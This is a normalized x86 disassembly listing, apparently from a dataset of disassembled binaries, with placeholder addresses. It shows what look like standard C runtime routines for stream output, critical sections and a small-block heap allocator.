call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_10017d06
pop ecx
sub_100102e7
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1000fb0b
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_10017d06
pop ecx
pop ebp
jmp sub_100101bf
pop ebp
jmp eax
sub_1001030d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_10010375
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10010362
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1001030d
pop ecx
mov esi eax
call sub_1001034f
mov [ eax ] esi
pop esi
pop ebp
retn
sub_10010398
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10012f31
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1001034f
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1001034f
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1001203c
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10013bd6
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_100186aa
pop ecx
test eax eax
jne r-xdata
call sub_1001203c
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10013bd6
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_10018661
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10018548
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_100104fc
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_10010398
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_1001052f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_100104fc
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_10010555
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_100104fc
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_1001034f
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_100104fc
sub_100105a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_1000c185
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1001034f
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_10012f31
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_1001113a
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_1001116a
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_100111de
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_10017666
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10011229
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1000c3e9
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_10011297
push 0xc
push r--data
call sub_10011e54
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_10013433
push 0x1e
call sub_10013288
push 0xff
call sub_1000e6f3
push 0x18
call sub_10015982
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1001034f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10011e99
retn
push edi
call sub_1000c3e9
pop ecx
push 0xfa0
push edi
call sub_10017666
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1000c3e9
pop ecx
call sub_1001034f
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011351
mov eax [ ebp - 0x1c ]
sub_1001135a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10011297
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1000e69f
pop ecx
sub_1001138d
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_100113bd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_100188a0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_100116d3
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_10011783
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_1001188b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_10011b6c
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
